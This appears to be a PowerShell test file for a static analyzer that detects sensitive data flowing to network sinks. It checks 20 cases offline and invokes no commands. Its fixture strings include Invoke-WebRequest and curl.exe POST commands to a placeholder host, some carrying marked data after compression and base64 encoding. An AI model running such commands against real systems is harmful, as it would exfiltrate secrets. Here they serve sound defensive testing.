# None of these script strings is invoked: the fixture passes source to the AST analyzer only.
$flowTarget = 'https://guard-fixture.invalid/submit'
$bodySink = 'Invoke-WebRequest -Method Post -Uri ' + "'$flowTarget'" + ' -Body $fmOutput'
$rawSink = 'curl.exe --data-binary $fmOutput ' + "'$flowTarget'"
$charFlow = '$fmText = ''fixture-sensitive-xyz''; $chars = $fmText.ToCharArray(); $fmAlias = $chars; [array]::Reverse($fmAlias); $fmOutput = -join $chars; '
$charEvent = Scan ($charFlow + $bodySink)
Is 1 $charEvent 'mutable alias retains provenance'
if ($charEvent.report.policy.evidence[0].flow[0].route -notmatch 'array reorder.*join characters') { throw 'Missing mutable-array provenance' }
Is 2 (Scan ($charFlow.Replace('fixture-sensitive-xyz', 'ordinary') + $bodySink)) 'clean array reorder'
Is 3 (Scan ($charFlow.Replace('[array]::Reverse($fmAlias);', '$fmAlias.SetValue([char]65, 0);') + $bodySink)) 'opaque mutation only warns'
Is 2 (Scan ($charFlow + '$fmOutput = ''ordinary''; ' + $bodySink)) 'clean overwrite removes marks'
Is 1 (Scan ('curl.exe -sS -H ''X-Test: fixture-sensitive-xyz'' ' + "'$flowTarget'")) 'ordinary curl headers carry sensitive data'
Is 3 (Scan ('curl.exe -sS -H ''@unknown.txt'' --data-raw normal ' + "'$flowTarget'")) 'unproven curl header file only warns'
Is 1 (Scan ('$fmInputText = ''fixture-sensitive-xyz''; foreach($fmIterator in @(''left'',''right'')) { $fmOutput = $fmInputText }; ' + $bodySink)) 'literal foreach preserves definite data flow'
Is 2 (Scan ('$fmInputText = ''fixture-sensitive-xyz''; foreach($fmIterator in @(''left'',''right'')) { $fmOutput = ''ordinary'' }; ' + $bodySink)) 'literal foreach clean overwrite'
Is 3 (Scan ('$fmInputText = ''fixture-sensitive-xyz''; foreach($fmIterator in (1..100)) { $fmOutput = $fmInputText }; ' + $bodySink)) 'unsupported loop only warns'
$singleCodec = @(
    '$message = [Text.Encoding]::UTF8.GetBytes(''fixture-sensitive-xyz'')'
    '$buffer = [IO.MemoryStream]::new()'
    '$stream = [IO.Compression.GZipStream]::new($buffer,[IO.Compression.CompressionMode]::Compress,$true)'
    '$stream.Write($message,0,$message.Length)'
    '$stream.Dispose()'
    '$fmOutput = [Convert]::ToBase64String($buffer.ToArray())'
) -join '; '
foreach ($codec in 'GZipStream','DeflateStream','BrotliStream') {
    $example = $singleCodec.Replace('GZipStream',$codec)
    $event = Scan ($example + '; ' + $rawSink)
    Is 1 $event "symbolic $codec body"
    if ($event.report.policy.evidence[0].flow[0].route -notmatch "$codec.*Base64 encode.*curl") { throw "Missing $codec provenance" }
}
Is 3 (Scan ($singleCodec.Replace('$stream.Dispose(); ', '') + '; ' + $rawSink)) 'unfinalized compression warns without a speculative match'
Is 3 (Scan ($singleCodec.Replace('$message,0,', '$message,1,') + '; ' + $rawSink)) 'unmodelled partial write only warns'
Is 3 (Scan ($singleCodec.Replace('fixture-sensitive-xyz', 'ordinary') + '; ' + $rawSink)) 'unknown concrete bytes without a mark only warn'
Is 2 (Scan ($singleCodec + '; ' + $rawSink.Replace($flowTarget,'http://127.0.0.1:7777/submit'))) 'loopback remains exempt'
$factory = @(
    '$buffer = [IO.MemoryStream]::new()'
    'foreach($codec in @(''GZipStream'')){ $stream = New-Object -TypeName "System.IO.Compression.$codec" -ArgumentList @($buffer,[IO.Compression.CompressionMode]::Compress,$true); $stream.Dispose() }'
    '$fmOutput = ''fixture-sensitive-xyz'''
) -join '; '
Is 1 (Scan ($factory + '; ' + $bodySink)) 'allowlisted dynamic type resolved inside a literal loop'
Is 1 (Scan ($factory.Replace('GZipStream', 'UnmodelledStream') + '; ' + $bodySink)) 'unknown dynamic type does not erase a later definite assignment'
# The scan harness uses a variable named $text too. Its old runtime value is unrelated
# to this definite assignment, even on a warm runspace with a cached observation.
Is 1 (Scan ($charFlow.Replace('$fmText','$text') + $bodySink)) 'first definite assignment overwrites diagnostic-only variable'
Is 2 (Scan ($charFlow.Replace('$fmText','$text').Replace('fixture-sensitive-xyz','ordinary') + $bodySink)) 'warm diagnostic cache is not a rule input'
'PASS: 20 offline provenance, mutation, loop, compression and curl cases; no commands invoked.'
